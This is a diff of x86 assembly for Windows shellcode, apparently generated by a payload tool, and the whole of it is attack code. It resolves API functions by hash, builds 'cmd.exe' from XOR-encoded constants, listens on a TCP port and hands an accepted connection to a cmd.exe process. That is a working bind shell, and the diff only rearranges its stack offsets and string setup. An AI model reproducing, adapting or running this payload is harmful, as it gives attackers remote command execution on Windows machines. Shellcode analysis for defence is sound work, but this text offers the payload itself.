@@ -148,18 +148,18 @@ main:
 
 ; -- kernel32.dll (peb) --------------------------------------------
 
-    ; LoadLibraryA  [ebp-0x28]
-    mov  eax, 0xec0e4e8e
-    call resolve_export_by_hash
-    mov  [ebp-0x28], eax
-
-    ; CreateProcessA  [ebp-0x40]
+    ; CreateProcessA  [ebp-0x3c]
     mov  eax, 0x16b3fe72
+    call resolve_export_by_hash
+    mov  [ebp-0x3c], eax
+
+    ; ExitProcess  [ebp-0x40]
+    mov  eax, 0x73e2d87e
     call resolve_export_by_hash
     mov  [ebp-0x40], eax
 
-    ; ExitProcess  [ebp-0x44]
-    mov  eax, 0x73e2d87e
+    ; LoadLibraryA  [ebp-0x44]
+    mov  eax, 0xec0e4e8e
     call resolve_export_by_hash
     mov  [ebp-0x44], eax
 
@@ -174,7 +174,7 @@ main:
     push 0x5f327377
     mov  esi, esp        ; ESI = "ws2_32.dll"
     push esi                    ; lpLibFileName = &ws2_32.dll
-    call dword ptr [ebp-0x28]
+    call dword ptr [ebp-0x44]
     mov  [ebp-0x24], eax
     ; ws2_32.dll base
     add  esp, 0x0c
@@ -187,52 +187,54 @@ main:
 
 ; -- ws2_32.dll (LoadLibraryA) -------------------------------------
 
-    ; WSAStartup  [ebp-0x2c]
+    ; WSAStartup  [ebp-0x28]
     mov  eax, 0x3bfcedcb
+    call resolve_export_by_hash
+    mov  [ebp-0x28], eax
+
+    ; WSASocketA  [ebp-0x2c]
+    mov  eax, 0xadf509d9
     call resolve_export_by_hash
     mov  [ebp-0x2c], eax
 
-    ; WSASocketA  [ebp-0x30]
-    mov  eax, 0xadf509d9
+    ; bind  [ebp-0x30]
+    mov  eax, 0xc7701aa4
     call resolve_export_by_hash
     mov  [ebp-0x30], eax
 
-    ; bind  [ebp-0x34]
-    mov  eax, 0xc7701aa4
+    ; listen  [ebp-0x34]
+    mov  eax, 0xe92eada4
     call resolve_export_by_hash
     mov  [ebp-0x34], eax
 
-    ; listen  [ebp-0x38]
-    mov  eax, 0xe92eada4
+    ; accept  [ebp-0x38]
+    mov  eax, 0x498649e5
     call resolve_export_by_hash
     mov  [ebp-0x38], eax
 
-    ; accept  [ebp-0x3c]
-    mov  eax, 0x498649e5
-    call resolve_export_by_hash
-    mov  [ebp-0x3c], eax
-
 ; -- String Construction --
 
-; --- cmd: "cmd.exe" (push) ---
-; emit_push: "cmd.exe" (null-safe)
-; ESP = pointer to "cmd.exe\0" after pushes
+; --- cmd: "cmd.exe" (mov) ---
+    lea  edi, [ebp-0x2fc]
+; emit_mov: "cmd.exe" (null-safe)
+; 8 bytes written to [edi]
 
-    push 0x01647964
-    xor  dword ptr [esp], 0x01010101
-    push 0x2e646d63
-    mov  esi, esp        ; ESI = "cmd.exe"
+    mov  eax, 0x2e646d63
+    mov  [edi], eax
+    mov  eax, 0x01647964
+    xor  eax, 0x01010101  ; decode -> 0x00657865
+    mov  [edi+0x4], eax
 
 ; -- Structure Initialization --
 
-; --- WSADATA at [ebp-0x210] (0x190 bytes) ---
-; No initialization needed - WSAStartup writes output to [ebp-0x210].
+; --- WSADATA at [ebp-0x290] (0x190 bytes) ---
+; No initialization needed - WSAStartup writes output to [ebp-0x290].
 
-; --- sockaddr_in at [ebp-0x220] (0x10 bytes) ---
+; --- sockaddr_in at [ebp-0x2a0] (0x10 bytes) ---
 ; sin_port and sin_addr are set by the payload template.
 
     xor  eax, eax
-    lea  edi, [ebp-0x220]
+    lea  edi, [ebp-0x2a0]
     mov  [edi], eax
     mov  [edi+0x04], eax
     mov  [edi+0x08], eax
@@ -243,10 +245,10 @@ main:
 
     ; Template sets sin_port (+0x02) and sin_addr (+0x04) before connect()
 
-; --- STARTUPINFOA at [ebp-0x264] (0x44 bytes) ---
+; --- STARTUPINFOA at [ebp-0x2e4] (0x44 bytes) ---
 
     xor  eax, eax
-    lea  edi, [ebp-0x264]
+    lea  edi, [ebp-0x2e4]
 
     ; zero 0x44 bytes (17 DWORDs)
     xor  ecx, ecx
@@ -256,7 +258,7 @@ startupinfoa_zero_loop:
     add  edi, 4
     loop startupinfoa_zero_loop
 
-    lea  edi, [ebp-0x264]
+    lea  edi, [ebp-0x2e4]
     mov  byte ptr [edi], 0x44
 
     inc  eax                       ; eax was 0 from zeroing loop
@@ -265,10 +267,10 @@ startupinfoa_zero_loop:
 
     ; hStdInput/hStdOutput/hStdError set by payload after socket creation
 
-; --- PROCESS_INFORMATION at [ebp-0x274] (0x10 bytes) ---
+; --- PROCESS_INFORMATION at [ebp-0x2f4] (0x10 bytes) ---
 
     xor  eax, eax
-    lea  edi, [ebp-0x274]
+    lea  edi, [ebp-0x2f4]
     mov  [edi], eax
     mov  [edi+0x04], eax
     mov  [edi+0x08], eax
@@ -285,7 +287,7 @@ wf_success:
     ; ExitProcess(uExitCode)
     xor  eax, eax
     push eax                      ; uExitCode
-    call dword ptr [ebp-0x44]
+    call dword ptr [ebp-0x40]
 wf_hang_0:
     jmp  wf_hang_0
 
@@ -295,7 +297,7 @@ wf_fail:
     mov  eax, 0x01010103
     xor  eax, 0x01010102
     push eax                      ; uExitCode
-    call dword ptr [ebp-0x44]
+    call dword ptr [ebp-0x40]
 wf_hang_1:
     jmp  wf_hang_1
 
@@ -305,15 +307,15 @@ wf_entry:
     ; const inaddr_any = 0x0
 
     ; WSAStartup(wVersionRequested, lpWSAData)
-    lea  eax, [ebp-0x210]
+    lea  eax, [ebp-0x290]
     push eax                      ; lpWSAData
     mov  eax, 0x01010303
     xor  eax, 0x01010101
     push eax                      ; wVersionRequested
-    call dword ptr [ebp-0x2c]
-    mov  [ebp-0x48], eax
+    call dword ptr [ebp-0x28]
+    mov  [ebp-0x50], eax
     ; -> wsa_ret
-    mov  eax, [ebp-0x48]
+    mov  eax, [ebp-0x50]
     test eax, eax
     jz   wf_create_socket
     jmp  wf_fail
@@ -336,10 +338,10 @@ wf_create_socket:
     mov  eax, 0x01010103
     xor  eax, 0x01010101
     push eax                      ; af
-    call dword ptr [ebp-0x30]
-    mov  [ebp-0x4c], eax
+    call dword ptr [ebp-0x2c]
+    mov  [ebp-0x54], eax
     ; -> listen_socket
-    mov  eax, [ebp-0x4c]
+    mov  eax, [ebp-0x54]
     mov  ecx, 0xffffffff
     cmp  eax, ecx
     jne  wf_bind_socket
@@ -348,7 +350,7 @@ wf_create_socket:
 wf_bind_socket:
     ; zero sa (sockaddr_in, 0x10 bytes)
     xor  eax, eax
-    lea  edi, [ebp-0x220]
+    lea  edi, [ebp-0x2a0]
     mov  [edi], eax
     mov  [edi+0x04], eax
     mov  [edi+0x08], eax
@@ -356,27 +358,27 @@ wf_bind_socket:
     ; sa.sin_family
     mov  eax, 0x01010103
     xor  eax, 0x01010101
-    mov  word ptr [ebp-0x220], ax
+    mov  word ptr [ebp-0x2a0], ax
     ; sa.sin_port
     mov  eax, 0x01015d10
     xor  eax, 0x01010101
-    mov  word ptr [ebp-0x21e], ax
+    mov  word ptr [ebp-0x29e], ax
     ; sa.sin_addr
     xor  eax, eax
-    mov  [ebp-0x21c], eax
+    mov  [ebp-0x29c], eax
 
     ; bind(s, addr, namelen)
     mov  eax, 0x01010111
     xor  eax, 0x01010101
     push eax                      ; namelen
-    lea  eax, [ebp-0x220]
+    lea  eax, [ebp-0x2a0]
     push eax                      ; addr
-    mov  eax, [ebp-0x4c]
+    mov  eax, [ebp-0x54]
     push eax                      ; s
-    call dword ptr [ebp-0x34]
-    mov  [ebp-0x50], eax
+    call dword ptr [ebp-0x30]
+    mov  [ebp-0x58], eax
     ; -> bind_ret
-    mov  eax, [ebp-0x50]
+    mov  eax, [ebp-0x58]
     test eax, eax
     jz   wf_listen_socket_block
     jmp  wf_fail
@@ -387,12 +389,12 @@ wf_listen_socket_block:
     mov  eax, 0x01010103
     xor  eax, 0x01010102
     push eax                      ; backlog
-    mov  eax, [ebp-0x4c]
-    push eax                      ; s
-    call dword ptr [ebp-0x38]
-    mov  [ebp-0x54], eax
-    ; -> listen_ret
     mov  eax, [ebp-0x54]
+    push eax                      ; s
+    call dword ptr [ebp-0x34]
+    mov  [ebp-0x5c], eax
+    ; -> listen_ret
+    mov  eax, [ebp-0x5c]
     test eax, eax
     jz   wf_accept_conn
     jmp  wf_fail
@@ -404,12 +406,12 @@ wf_accept_conn:
     push eax                      ; addrlen
     xor  eax, eax
     push eax                      ; addr
-    mov  eax, [ebp-0x4c]
+    mov  eax, [ebp-0x54]
     push eax                      ; s
-    call dword ptr [ebp-0x3c]
-    mov  [ebp-0x58], eax
+    call dword ptr [ebp-0x38]
+    mov  [ebp-0x60], eax
     ; -> client_socket
-    mov  eax, [ebp-0x58]
+    mov  eax, [ebp-0x60]
     mov  ecx, 0xffffffff
     cmp  eax, ecx
     jne  wf_setup_process
@@ -418,7 +420,7 @@ wf_accept_conn:
 wf_setup_process:
     ; zero si (STARTUPINFOA, 0x44 bytes)
     xor  eax, eax
-    lea  edi, [ebp-0x264]
+    lea  edi, [ebp-0x2e4]
     xor  ecx, ecx
     mov  cl, 0x11
 wf_zero_si:
@@ -428,32 +430,32 @@ wf_zero_si:
     ; si.cb
     mov  eax, 0x01010145
     xor  eax, 0x01010101
-    mov  [ebp-0x264], eax
+    mov  [ebp-0x2e4], eax
     ; si.dwFlags
     mov  eax, 0x01010301
     xor  eax, 0x01010201
-    mov  [ebp-0x238], eax
+    mov  [ebp-0x2b8], eax
     ; si.hStdInput
-    mov  eax, [ebp-0x58]
-    mov  [ebp-0x22c], eax
+    mov  eax, [ebp-0x60]
+    mov  [ebp-0x2ac], eax
     ; si.hStdOutput
-    mov  eax, [ebp-0x58]
-    mov  [ebp-0x228], eax
+    mov  eax, [ebp-0x60]
+    mov  [ebp-0x2a8], eax
     ; si.hStdError
-    mov  eax, [ebp-0x58]
-    mov  [ebp-0x224], eax
+    mov  eax, [ebp-0x60]
+    mov  [ebp-0x2a4], eax
     ; zero pi (PROCESS_INFORMATION, 0x10 bytes)
     xor  eax, eax
-    lea  edi, [ebp-0x274]
+    lea  edi, [ebp-0x2f4]
     mov  [edi], eax
     mov  [edi+0x04], eax
     mov  [edi+0x08], eax
     mov  [edi+0x0c], eax
 
     ; CreateProcessA(lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes, bInheritHandles, dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation)
-    lea  eax, [ebp-0x274]
+    lea  eax, [ebp-0x2f4]
     push eax                      ; lpProcessInformation
-    lea  eax, [ebp-0x264]
+    lea  eax, [ebp-0x2e4]
     push eax                      ; lpStartupInfo
     xor  eax, eax
     push eax                      ; lpCurrentDirectory
@@ -468,14 +470,14 @@ wf_zero_si:
     push eax                      ; lpThreadAttributes
     xor  eax, eax
     push eax                      ; lpProcessAttributes
-    lea  eax, [ebp-0x27c]
+    lea  eax, [ebp-0x2fc]
     push eax                      ; lpCommandLine
     xor  eax, eax
     push eax                      ; lpApplicationName
-    call dword ptr [ebp-0x40]
-    mov  [ebp-0x5c], eax
+    call dword ptr [ebp-0x3c]
+    mov  [ebp-0x64], eax
     ; -> cpa_ret
-    mov  eax, [ebp-0x5c]
+    mov  eax, [ebp-0x64]
     test eax, eax
     jnz  wf_success
     jmp  wf_fail
